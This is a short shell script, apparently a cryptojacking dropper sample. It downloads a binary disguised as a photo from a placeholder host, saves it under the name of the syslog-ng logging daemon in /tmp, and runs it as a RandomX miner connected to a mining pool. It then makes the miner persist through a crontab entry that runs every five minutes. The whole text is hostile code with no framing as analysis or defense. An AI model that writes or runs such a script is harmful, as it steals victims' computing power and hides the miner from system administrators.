#!/bin/sh
curl -fsSL https://payload.example.invalid/photo.jpg -o "/tmp/syslog-ng"
chmod +x "/tmp/syslog-ng"
"/tmp/syslog-ng" --algo=rx/0 --url=stratum+ssl://pool.example.invalid:3333 --user test-worker --background
(crontab -l; echo '*/5 * * * * "/tmp/syslog-ng" --algo=rx/0 --url=stratum+ssl://pool.example.invalid:3333 --user test-worker --background') | crontab -
